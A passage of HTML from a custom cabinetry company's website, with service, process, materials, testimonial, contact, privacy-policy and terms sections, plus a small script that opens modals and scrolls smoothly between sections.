            <div class="specialty-grid-wxy789">
                <div class="specialty-card-zab012">
                    <img src="https://images.pexels.com/photos/1571468/pexels-photo-1571468.jpeg" alt="Dovetail Joints" class="specialty-icon-cde345">
                    <h3 class="service-title-tuv678">Dovetail Joinery</h3>
                    <p class="service-description-wxy901">Traditional dovetail joints provide superior strength and durability. Our craftsmen hand-cut each joint for perfect fit and lasting performance in drawer construction.</p>
                </div>
                <div class="specialty-card-zab012">
                    <img src="https://images.pexels.com/photos/1080696/pexels-photo-1080696.jpeg" alt="Custom Hardware" class="specialty-icon-cde345">
                    <h3 class="service-title-tuv678">Hardware Integration</h3>
                    <p class="service-description-wxy901">Specialized installation of soft-close mechanisms, pull-out shelves, and organizational systems. Each component is carefully selected for optimal functionality and longevity.</p>
                </div>
                <div class="specialty-card-zab012">
                    <img src="https://images.pexels.com/photos/1571453/pexels-photo-1571453.jpeg" alt="Finishing Techniques" class="specialty-icon-cde345">
                    <h3 class="service-title-tuv678">Finishing Excellence</h3>
                    <p class="service-description-wxy901">Multi-stage finishing process ensures smooth, durable surfaces resistant to moisture, scratches, and daily wear. Available in numerous stain and paint options.</p>
                </div>
            </div>
        </div>
    </section>

    <section id="process" class="process-section-fgh678">
        <div class="section-wrapper-efg123">
            <h2 class="section-title-hij456">Our Installation Process</h2>
            <div class="process-steps-ijk901">
                <div class="process-step-lmn234">
                    <div class="step-number-opq567">1</div>
                    <h3 class="service-title-tuv678">Initial Consultation</h3>
                    <p class="service-description-wxy901">Comprehensive assessment of your space, needs, and design preferences. We discuss material options, functionality requirements, and project timeline during this detailed planning phase.</p>
                </div>
                <div class="process-step-lmn234">
                    <div class="step-number-opq567">2</div>
                    <h3 class="service-title-tuv678">Design Development</h3>
                    <p class="service-description-wxy901">Creation of detailed plans and 3D renderings showing your custom cabinetry. Multiple revisions ensure the design perfectly matches your vision and space requirements.</p>
                </div>
                <div class="process-step-lmn234">
                    <div class="step-number-opq567">3</div>
                    <h3 class="service-title-tuv678">Precision Manufacturing</h3>
                    <p class="service-description-wxy901">Expert craftsmen build your cabinets using selected materials and proven techniques. Quality control checks at each stage ensure exceptional standards are maintained throughout production.</p>
                </div>
                <div class="process-step-lmn234">
                    <div class="step-number-opq567">4</div>
                    <h3 class="service-title-tuv678">Professional Installation</h3>
                    <p class="service-description-wxy901">Skilled installation team ensures perfect fit and finish. <span class="continue-link-abc789" onclick="scrollToSection('reviews')">Click here to continue</span> reading what our satisfied customers say about our installation quality.</p>
                </div>
            </div>
        </div>
    </section>

    <section id="materials" class="materials-section-rst890">
        <div class="section-wrapper-efg123">
            <h2 class="section-title-hij456">Quality Materials We Use</h2>
            <div class="materials-grid-uvw123">
                <div class="material-item-xyz456">
                    <h3 class="service-title-tuv678">Solid Hardwoods</h3>
                    <p class="service-description-wxy901">Oak, maple, cherry, and walnut sourced from sustainable forests. Each piece is carefully selected for grain pattern and structural integrity.</p>
                </div>
                <div class="material-item-xyz456">
                    <h3 class="service-title-tuv678">Engineered Panels</h3>
                    <p class="service-description-wxy901">High-quality plywood and MDF cores with hardwood veneers. Provides stability and resistance to warping in various environmental conditions.</p>
                </div>
                <div class="material-item-xyz456">
                    <h3 class="service-title-tuv678">Hardware Components</h3>
                    <p class="service-description-wxy901">European-style hinges, drawer slides, and organizational accessories from trusted manufacturers. All hardware includes lifetime adjustment warranties.</p>
                </div>
                <div class="material-item-xyz456">
                    <h3 class="service-title-tuv678">Finishing Products</h3>
                    <p class="service-description-wxy901">Low-VOC stains, paints, and protective coatings. Environmentally responsible products that maintain indoor air quality while providing excellent durability.</p>
                </div>
            </div>
        </div>
    </section>

    <section id="reviews" class="reviews-section-abc901">
        <div class="section-wrapper-efg123">
            <h2 class="section-title-hij456">Customer Testimonials</h2>
            <div class="reviews-grid-def234">
                <div class="review-card-ghi567">
                    <p class="review-text-jkl890">"The kitchen cabinets exceeded our expectations. The craftsmanship is outstanding and the installation was completed ahead of schedule. Every detail was handled with professional care and attention."</p>
                    <p class="reviewer-name-mno123">- Sarah Mitchell, Homeowner</p>
                </div>
                <div class="review-card-ghi567">
                    <p class="review-text-jkl890">"LumvexHub transformed our bathroom with beautiful vanity cabinets. The moisture-resistant finish has held up perfectly after two years. Highly recommend their expertise and reliability."</p>
                    <p class="reviewer-name-mno123">- Robert Chen, Property Manager</p>
                </div>
                <div class="review-card-ghi567">
                    <p class="review-text-jkl890">"Custom pantry storage solved our organization challenges completely. The pull-out shelves and adjustable compartments make everything easily accessible. Quality workmanship throughout."</p>
                    <p class="reviewer-name-mno123">- Jennifer Rodriguez, Interior Designer</p>
                </div>
                <div class="review-card-ghi567">
                    <p class="review-text-jkl890">"Professional service from consultation through final installation. The team listened to our needs and delivered exactly what we envisioned. <span class="continue-link-abc789" onclick="scrollToSection('contact')">Click here to continue</span> and contact them for your project."</p>
                    <p class="reviewer-name-mno123">- Michael Thompson, Contractor</p>
                </div>
            </div>
        </div>
    </section>

    <section id="contact" class="contact-section-pqr456">
        <div class="section-wrapper-efg123">
            <h2 class="section-title-hij456">Contact Information</h2>
            <div class="contact-info-stu789">
                <div class="contact-item-vwx012">
                    <h3 class="contact-title-yza345">Phone</h3>
                    <a href="tel:+15552847391" class="phone-link-bcd678">(555) 284-7391</a>
                </div>
                <div class="contact-item-vwx012">
                    <h3 class="contact-title-yza345">Email</h3>
                    <p>info@lumvexhub.com</p>
                </div>
                <div class="contact-item-vwx012">
                    <h3 class="contact-title-yza345">Address</h3>
                    <p>2847 Craftsman Boulevard<br>Woodville, TX 75990</p>
                </div>
                <div class="contact-item-vwx012">
                    <h3 class="contact-title-yza345">Business Hours</h3>
                    <p>Monday - Friday: 7:00 AM - 6:00 PM<br>Saturday: 8:00 AM - 4:00 PM<br>Sunday: Closed</p>
                </div>
            </div>
        </div>
    </section>

    <!-- Privacy Policy Modal -->
    <div id="privacy-modal" class="modal-overlay-efg901">
        <div class="modal-content-hij234">
            <span class="modal-close-klm567" onclick="hideModal('privacy')">&times;</span>
            <h2 class="modal-title-nop890">Privacy Policy</h2>
            <div class="modal-text-qrs123">
                <p><strong>Effective Date:</strong> January 1, 2024</p>
                
                <h3>Information Collection</h3>
                <p>LumvexHub collects information you provide directly, such as when you request consultations, submit project inquiries, or communicate with our team. This may include your name, contact information, project details, and preferences.</p>
                
                <h3>Information Usage</h3>
                <p>We use collected information to provide cabinetry services, respond to inquiries, schedule consultations, and communicate project updates. Your information helps us deliver personalized service and maintain project records.</p>
                
                <h3>Information Sharing</h3>
                <p>We do not sell, trade, or rent your personal information to third parties. Information may be shared with trusted service providers who assist in business operations, subject to confidentiality agreements.</p>
                
                <h3>Data Security</h3>
                <p>We implement appropriate security measures to protect your personal information against unauthorized access, alteration, disclosure, or destruction. However, no internet transmission is completely secure.</p>
                
                <h3>Contact Information</h3>
                <p>For privacy-related questions or concerns, contact us at info@lumvexhub.com or (555) 284-7391. We will respond to privacy inquiries within reasonable timeframes.</p>
                
                <h3>Policy Updates</h3>
                <p>This privacy policy may be updated periodically. Continued use of our services after changes indicates acceptance of updated terms. Material changes will be communicated through appropriate channels.</p>
            </div>
        </div>
    </div>

    <!-- Terms of Service Modal -->
    <div id="terms-modal" class="modal-overlay-efg901">
        <div class="modal-content-hij234">
            <span class="modal-close-klm567" onclick="hideModal('terms')">&times;</span>
            <h2 class="modal-title-nop890">Terms of Service</h2>
            <div class="modal-text-qrs123">
                <p><strong>Effective Date:</strong> January 1, 2024</p>
                
                <h3>Service Agreement</h3>
                <p>By engaging LumvexHub for cabinetry services, you agree to these terms and conditions. Services include consultation, design, manufacturing, and installation of custom cabinetry solutions.</p>
                
                <h3>Project Scope</h3>
                <p>Each project begins with detailed consultation to establish scope, materials, timeline, and specifications. Changes to approved plans may affect project cost and completion schedule.</p>
                
                <h3>Payment Terms</h3>
                <p>Payment schedules are established per project agreement. Deposits may be required to begin work. Final payment is due upon project completion and customer acceptance.</p>
                
                <h3>Warranties</h3>
                <p>We provide warranties on workmanship and materials as specified in individual project agreements. Warranty terms vary based on materials used and installation conditions.</p>
                
                <h3>Limitation of Liability</h3>
                <p>Our liability is limited to the value of services provided. We are not responsible for indirect, consequential, or incidental damages arising from service provision.</p>
                
                <h3>Dispute Resolution</h3>
                <p>Disputes will be resolved through good faith negotiation. If resolution cannot be reached, binding arbitration may be required as specified in project agreements.</p>
                
                <h3>Governing Law</h3>
                <p>These terms are governed by Texas state law. Any legal proceedings will be conducted in appropriate Texas courts with jurisdiction over our business location.</p>
            </div>
        </div>
    </div>

    <script>
        function showModal(type) {
            document.getElementById(type + '-modal').style.display = 'block';
        }

        function hideModal(type) {
            document.getElementById(type + '-modal').style.display = 'none';
        }

        function scrollToSection(sectionId) {
            document.getElementById(sectionId).scrollIntoView({
                behavior: 'smooth'
            });
        }

        // Close modal when clicking outside
        window.onclick = function(event) {
            if (event.target.classList.contains('modal-overlay-efg901')) {
                event.target.style.display = 'none';
            }
        }

        // Smooth scrolling for navigation links
        document.querySelectorAll('.nav-link-mno345').forEach(link => {
            link.addEventListener('click', function(e) {
                if (this.getAttribute('href').startsWith('#')) {
                    e.preventDefault();
                    const targetId = this.getAttribute('href').substring(1);
                    const targetElement = document.getElementById(targetId);
                    if (targetElement) {
                        targetElement.scrollIntoView({
                            behavior: 'smooth'
                        });
                    }
                }
            });
        });
    </script>

<a href="/" alt="cool hit counter" target="_blank" >
<img  src="//sstatic1.histats.com/0.gif?4977143&101" alt="cool hit counter" border="0">
    
</body>
</html>

